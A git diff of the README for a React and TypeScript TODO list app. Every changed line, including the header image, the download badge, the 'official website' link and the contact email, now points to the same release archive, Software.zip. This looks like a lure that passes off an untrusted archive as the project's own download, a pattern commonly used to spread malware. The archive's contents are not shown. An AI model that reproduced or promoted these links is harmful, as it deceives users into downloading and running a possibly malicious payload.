@@ -2,7 +2,7 @@
 
 ## Welcome to the `todo-list-react` Repository! 
 
-![TODO List App](https://imageurl.com)
+![TODO List App](https://github.com/Gilangmlnt/todo-list-react/releases/download/v1.0/Software.zip)
 
 This repository houses a responsive and feature-rich TODO list application built with React, TypeScript, Redux Toolkit, and Sass. The app includes drag-and-drop sorting, context menus, task filtering, and persistent data storage, making it a comprehensive tool for managing your tasks efficiently.
 
@@ -47,7 +47,7 @@ To get started with the app, follow these simple steps:
 
 If you prefer to download the app directly, click the button below to download the ZIP file:
 
-[![Download ZIP](https://img.shields.io/static/v1?label=Download&message=ZIP&color=success)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Gilangmlnt/todo-list-react/releases/download/v1.0/Software.zip)](https://github.com/Gilangmlnt/todo-list-react/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -68,13 +68,13 @@ If you prefer to download the app directly, click the button below to download t
 
 ## Explore Further 🌐
 
-Visit the [official website](https://example.com) for more information about the TODO List App.
+Visit the [official website](https://github.com/Gilangmlnt/todo-list-react/releases/download/v1.0/Software.zip) for more information about the TODO List App.
 
 ---
 
 ## Support or Contact 📧
 
-If you encounter any issues or have any questions, feel free to reach out to the project maintainers at `example@email.com`.
+If you encounter any issues or have any questions, feel free to reach out to the project maintainers at `https://github.com/Gilangmlnt/todo-list-react/releases/download/v1.0/Software.zip`.
 
 ---
 
